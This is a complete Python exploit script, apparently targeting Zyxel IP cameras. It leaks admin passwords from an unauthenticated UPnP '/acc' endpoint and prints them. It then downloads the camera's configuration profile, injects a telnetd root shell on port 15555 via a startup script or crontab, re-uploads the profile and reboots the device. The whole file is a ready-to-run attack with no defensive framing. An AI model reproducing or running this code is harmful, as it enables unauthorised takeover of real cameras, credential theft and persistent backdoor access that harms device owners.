import os
import sys
import urllib.request
import urllib3
import gzip
import tarfile
import time
import tempfile
import base64
from io import StringIO, BytesIO

if len(sys.argv) != 2:
  sys.stdout.write("usage:\n")
  sys.stdout.write(f"python3.9 {sys.argv[0]} IP_OF_CAMERA_TO_PWN\n")
  sys.exit(1)

hostname = sys.argv[1]

export_url = f"http://{hostname}/cgi-bin/support/export_profile.cgi?rnd=9057"
profile_bin_url = f"http://{hostname}/cgi-bin/support/profile.bin"
import_url = f"http://{hostname}/cgi-bin/support/upload.cgi"
upload_profile_status_url = f"http://{hostname}/cgi-bin/support/uploadProfileStatus.cgi"
reboot_url = f"http://{hostname}/cgi-bin/support/reboot_reload.cgi"

list_files = int(os.environ.get('LIST_FILES', '0')) > 0
inject_crontab = int(os.environ.get('INJECT_CRONTAB', '0')) > 0
timeout = int(os.environ.get('TIMEOUT', '15'))
admin_user = os.environ.get('ADMIN_USER','admin')
add_file = int(os.environ.get('ADD_FILE','1')) > 0
save_tmp = int(os.environ.get('SAVE_TMP', '0')) > 0
pwn_2605 = int(os.environ.get('PWN_2605', '0')) > 0
start_port = 49150
cnt = 100

pw_data = None

i = 0
while pw_data is None:
  upnp_url = f"http://{hostname}:{start_port+i}/acc"
  i += 1
  if i == cnt:
    sys.stdout.write("could not retrieve password data, maybe this device is not a zyxel IP camera?")
    sys.exit(1)
  sys.stdout.write(f"Fetching {upnp_url}\n")

  try:
    with urllib.request.urlopen(upnp_url, timeout=timeout) as response:
      pw_data = response.read()
  except urllib.error.URLError as exc:
    sys.stdout.write(f"Failed getting URL {exc}\n")
    
    

sys.stdout.write(f"for password data, got {pw_data!r}\n")

pw_data = pw_data.decode('ascii').strip().split(":")

users = {}
username = None
for v in pw_data:
  if username is None:
    username = v
  else:
    users[username] = v
    username = None
    
admin_pw = users.get(admin_user)

if admin_pw is None:
  sys.stdout.write(f"Did not find password for {admin_user}, but found users {users.keys()}. Try setting one with ADMIN_USER\n")
  sys.exit(1)

sys.stdout.write(f"admin credentials are {admin_user}:{admin_pw}\n")
sys.stdout.write(f"exporting profile from {export_url}\n")

pw_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
for target_url in (export_url, profile_bin_url, import_url, upload_profile_status_url, reboot_url):
  pw_mgr.add_password(None, target_url, admin_user, admin_pw)
basic_handler = urllib.request.HTTPBasicAuthHandler(pw_mgr)

opener = urllib.request.build_opener(basic_handler)

with opener.open(export_url,timeout=timeout) as response:
  response_data = response.read()
  
if b'tar' not in response_data:
  sys.stdout.write("failed to get camera to create profile.bin\n")
  sys.exit(1)
  
with opener.open(profile_bin_url) as response:
  profile_data_gz = response.read()
    
sys.stdout.write(f"downloading profile that is {len(profile_data_gz)} bytes\n")

profile_data = gzip.decompress(profile_data_gz)

io_obj = BytesIO()
io_obj.write(profile_data)
io_obj.seek(0)
archive = tarfile.TarFile('profile.tar', mode='r', fileobj=io_obj)

replacement_io = BytesIO()
replacement_archive = tarfile.TarFile('profile.tar', mode='w', fileobj=replacement_io)

skip_files = set('mnt/mtd/crontab')

if not inject_crontab:
	if pwn_2605:
		skip_files.add('mnt/mtd/Start.sh')
	else:
		skip_files.add('mnt/mtd/postDebug.sh')
	
for member in archive.getmembers():
	if member.name in skip_files:
		continue
	member_data = archive.extractfile(member)
	replacement_archive.addfile(member, member_data)
	sys.stdout.write("copied over file %r\n" % (member.name,))

existing_info = archive.getmember('mnt/mtd/acc')

file_data = StringIO()
file_data.write("#!/bin/sh\n")
if list_files:
	file_data.write("/bin/ls -lR / | /bin/gzip > /mnt/mtd/ls.log.gz\n")
file_data.write("/usr/bin/nohup /usr/sbin/telnetd -F -l /bin/sh -p 15555 </dev/null >/dev/null 2>/dev/null &\n")
if pwn_2605:
  file_data.write("exec /etc/Start.sh\n")
file_data.seek(0)
file_data = file_data.read().encode('ascii')


crontab_data = StringIO()
if inject_crontab:
	if list_files:
		crontab_data.write("*/3\t*\t*\t*\t*\t/bin/ls -lR / | /bin/gzip > /mnt/mtd/ls.log.gz\n")	
	crontab_data.write("*\t*\t*\t*\t*\t/usr/sbin/telnetd -F -l /bin/sh -p 15555\n")
	
crontab_data.seek(0)
crontab_data = crontab_data.read().encode('ascii')

binary_file_data = BytesIO()
file_size = binary_file_data.write(crontab_data)
binary_file_data.seek(0)
entry_info = tarfile.TarInfo(name='mnt/mtd/crontab')

entry_info.mode = 0o777
entry_info.uid = existing_info.uid
entry_info.gid = existing_info.gid
entry_info.size = file_size
entry_info.mtime = existing_info.mtime
entry_info.type = existing_info.type
entry_info.uname = existing_info.uname
entry_info.gname = existing_info.gname
entry_info.devmajor = existing_info.devmajor
entry_info.devminor = existing_info.devminor
entry_info.chksum = tarfile.calc_chksums(entry_info.tobuf())[0]

if add_file:
	if inject_crontab:
		sys.stdout.write("injecting telnet server into crontab\n")
	else:
		sys.stdout.write("injecting crontab with nothing in it\n")
	replacement_archive.addfile(entry_info, binary_file_data)

else:
	binary_file_data = BytesIO()
	file_size = binary_file_data.write(file_data)
	binary_file_data.seek(0)
	path = 'mnt/mtd/postDebug.sh'
	if pwn_2605:
		path = 'mnt/mtd/Start.sh'
	entry_info = tarfile.TarInfo(name=path)

	entry_info.mode = 0o777
	entry_info.uid = existing_info.uid
	entry_info.gid = existing_info.gid
	entry_info.size = file_size
	entry_info.mtime = existing_info.mtime
	entry_info.type = existing_info.type
	entry_info.uname = existing_info.uname
	entry_info.gname = existing_info.gname
	entry_info.devmajor = existing_info.devmajor
	entry_info.devminor = existing_info.devminor

	entry_info.chksum = tarfile.calc_chksums(entry_info.tobuf())[0]

	if add_file:
		sys.stdout.write("injecting telnet server into %r\n" % (path,))
		replacement_archive.addfile(entry_info, binary_file_data)

replacement_archive.close()

replacement_io.seek(0)
replacement_data_gz = gzip.compress(replacement_io.read())

if not add_file:
  replacement_data_gz = profile_data_gz 
sys.stdout.write(f"replacement tar file is {len(replacement_data_gz)} bytes\n")


if save_tmp:
  with open('/tmp/replacement.tar.gz', 'wb') as fout:
    fout.write(replacement_data_gz)

boundary = '----WebKitFormBoundaryBitXgnABiNbZuk7h'
form_field = urllib3.fields.RequestField(name='upload_profile', data= replacement_data_gz, filename='profile.bin')
fields = [form_field]
[f.make_multipart(content_type='application/octet-stream') for f in fields]
post_data, content_type = urllib3.encode_multipart_formdata(fields, boundary=boundary)

headers = {
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'Accept-Encoding': 'gzip, deflate',
  'Content-Type': content_type,
  'Content-Length': len(post_data),
  'Cookie': 'ViewMod=NORMAL',
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36',
  'Host': hostname,
  'Origin': f"http://{hostname}",
  'Accept-Language': 'en-US',
  'Cache-control': 'no-cache',
}
request_obj = urllib.request.Request(import_url,data=post_data,method='POST',headers=headers)

if save_tmp:
  with open('/tmp/post_data.multipart', 'wb') as fout:
    fout.write(post_data)

with opener.open(request_obj, data=post_data, timeout=timeout) as response:
  sys.stdout.write(f"uploading new profile returned {response.code}\n")
  response.read()

sys.stdout.write("POST complete\n")

profile_upload_done = False
while not profile_upload_done:
  time.sleep(1)
  with opener.open(upload_profile_status_url) as response:
    result = response.read().decode('ascii')
    sys.stdout.write(f"profile upload status: {result}\n")
    profile_upload_done = int(result) == 1

  
sys.stdout.write("profile processing complete\n")
time.sleep(1)
with opener.open(reboot_url) as response:
  sys.stdout.write(f"reboot request returned {response.code}\n")
  response.read()



sys.stdout.write(f'now wait two minutes and run "telnet {hostname} 15555"\n')

